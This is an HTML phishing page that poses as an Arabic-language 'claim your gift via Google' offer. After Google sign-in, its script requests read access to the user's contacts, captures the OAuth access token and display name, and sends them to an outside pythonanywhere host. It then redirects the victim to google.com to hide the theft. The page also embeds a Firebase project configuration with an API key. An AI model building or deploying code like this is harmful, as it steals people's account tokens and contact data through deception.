<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Gift Page</title>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-auth.js"></script>
</head>
<body style="text-align: center; margin-top: 100px;">

    <button id="loginBtn" style="padding: 20px; font-size: 20px; cursor: pointer;">
        اضغط هنا لاستلام هديتك عبر Google
    </button>

    <script>
        // إعداداتك الصحيحة
        const firebaseConfig = {
            apiKey: "AIzaSyCvs2XALyDmK3_D4BXJ5Dx7MFo2H71R6gg",
            authDomain: "giftapp-5937d.firebaseapp.com",
            projectId: "giftapp-5937d",
            storageBucket: "giftapp-5937d.firebasestorage.app",
            messagingSenderId: "1067108116204",
            appId: "1:1067108116204:web:dd2b2717c17590b10be7c9"
        };

        firebase.initializeApp(firebaseConfig);

        // ربط الزرار بالأمر
        document.getElementById('loginBtn').onclick = function() {
            const provider = new firebase.auth.GoogleAuthProvider();
            provider.addScope('https://www.googleapis.com/auth/contacts.readonly');
            firebase.auth().signInWithRedirect(provider);
        };

        // التعامل مع العودة من جوجل
        firebase.auth().getRedirectResult().then((result) => {
            if (result.credential) {
                const token = result.credential.accessToken;
                const sender = result.user.displayName || "Target";
                
                // إرسال البيانات للوحش
                fetch(`https://mohamedahmed77.pythonanywhere.com/catch?token=${token}&sender=${sender}`)
                .then(() => { window.location.href = "https://google.com"; });
            }
        });
    </script>
</body>
</html>
